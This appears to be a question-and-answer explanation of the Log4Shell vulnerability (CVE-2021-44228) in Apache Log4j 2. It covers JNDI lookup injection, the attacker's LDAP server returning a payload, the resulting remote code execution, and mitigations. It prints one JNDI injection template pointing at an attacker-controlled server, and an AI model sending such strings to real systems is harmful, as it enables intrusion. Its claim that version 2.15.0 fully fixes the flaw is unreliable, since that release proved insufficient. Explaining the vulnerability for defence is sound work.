Can you explain how the vulnerability in CVE-2021-44228 works? How is code execution achieved by an attacker? Please provide sources for everything.
CVE-2021-44228, also known as the Log4Shell vulnerability, is a critical security flaw in the Apache Log4j 2 library, a widely used Java-based logging utility. The vulnerability allows an attacker to perform remote code execution (RCE) by exploiting the way Log4j handles log messages containing JNDI (Java Naming and Directory Interface) references.

Here's a step-by-step explanation of how the vulnerability works and how an attacker can achieve code execution, along with sources for each step:

Attacker crafts a malicious input: The attacker creates a specially crafted input containing a JNDI reference. This typically looks like ${jndi:ldap://<attacker-controlled-server>/<payload>}. The attacker then sends this input to a vulnerable application that uses Log4j 2 for logging purposes.
Source: https://www.lunasec.io/docs/blog/log4j-zero-day/

Log4j processes the input: When the vulnerable application processes the attacker's input and generates a log message containing it, Log4j 2 attempts to resolve the JNDI reference. This causes the Java runtime to connect to the attacker-controlled LDAP server specified in the JNDI reference.
Source: https://www.randori.com/blog/cve-2021-44228/

LDAP server responds with a payload: The attacker's LDAP server responds to the Java runtime's query with a Java object, which is actually a malicious payload (typically a Java class implementing a gadget that can lead to arbitrary code execution). The payload is then loaded and executed by the Java runtime in the context of the vulnerable application.
Source: https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-log4shell/

Code execution: The malicious payload runs within the vulnerable application's environment, allowing the attacker to execute arbitrary code, access sensitive data, or perform other malicious actions.
Source: https://portswigger.net/daily-swig/apache-log4j-vulnerability-cve-2021-44228-what-you-need-to-know

The Log4Shell vulnerability is particularly dangerous because it can be exploited with minimal effort and requires only a crafted input sent to a vulnerable application. Additionally, Log4j 2 is used in many popular Java-based applications and frameworks, making the impact of this vulnerability widespread.

Mitigations for this vulnerability include upgrading Log4j to a patched version (2.15.0 or later), disabling JNDI lookups, or applying other configuration changes recommended by the Apache Log4j team.
Source: https://logging.apache.org/log4j/2.x/security.html
